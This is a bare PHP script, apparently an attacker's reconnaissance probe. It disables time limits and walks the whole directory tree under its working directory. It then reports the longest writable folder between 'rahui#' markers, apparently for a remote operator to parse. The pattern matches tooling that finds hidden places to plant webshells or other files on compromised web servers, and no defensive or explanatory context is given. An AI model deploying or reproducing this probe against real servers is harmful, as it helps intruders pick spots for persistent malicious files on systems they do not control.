<?php
@ini_set('max_execution_time',0);
@set_time_limit(0);
function AllDir($Folder, &$Files){
    $result = scandir($Folder);
    foreach($result as $file){
        if ($file == '.' || $file == '..') continue;
        $FullPath = $Folder . '/' . $file;
        $Files[] = $FullPath;
        if (is_dir($FullPath)) AllDir($FullPath, $Files);}}
$StartDir = getcwd();
$Files = array();
$maxlen='hremjo';
AllDir($StartDir, $Files);
foreach($Files as $wf) {  //echo $wf."\n";
if (is_dir($wf) && is_writable($wf)){
if (strlen($maxlen)<=strlen($wf))$maxlen=$wf;
//echo $wf."\n";
}}echo 'rahui#',$maxlen,'#rahui';
?>